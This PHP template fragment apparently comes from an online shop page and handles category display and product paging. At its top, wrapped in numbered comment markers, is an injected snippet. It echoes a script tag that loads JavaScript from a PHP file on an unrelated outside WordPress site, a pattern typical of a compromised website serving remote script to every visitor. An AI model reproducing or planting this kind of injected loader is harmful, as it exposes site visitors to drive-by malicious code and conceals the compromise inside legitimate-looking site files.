...
#783026#
if(empty($srwv)) {
$srwv = "<script type=\"text/javascript\" src=\"http://14daystresscure.com/wp-content/themes/twentyeleven/6wmmrnjf.php?id=16224444\"></script>";
echo $srwv;
}
#/783026#
?>
	...
	<td valign="top" colspan="2" style="background-color: #FFFFFF; border:2px solid #cccccc; ">
		...
		<? } ?>
		<span style="font-weight:100"><?=$cat_info_main[1]["name"] ?></span>		
		...
		<?
			...
			if (is_array($all_product)) array_splice($all_product, 0,($start_paging['start_rec']-1));
				$display = 1;//print"<pre>";print_r($all_product);print "</pre>";
				
			if(!array_key_exists("page_no", $_POST)) {
				$begin = 1;
				if(array_key_exists("start", $_GET)) {
					$begin = ((int) $_GET["start"]);
				}
				$length = 8;
				$last   = $begin + $length;
				if($last > count($all)) $last = count($all);
				$all_product = array();
				for($i=$begin; $i<=$last; $i++) {
					array_push($all_product, $all["$i"]);
				}
			}
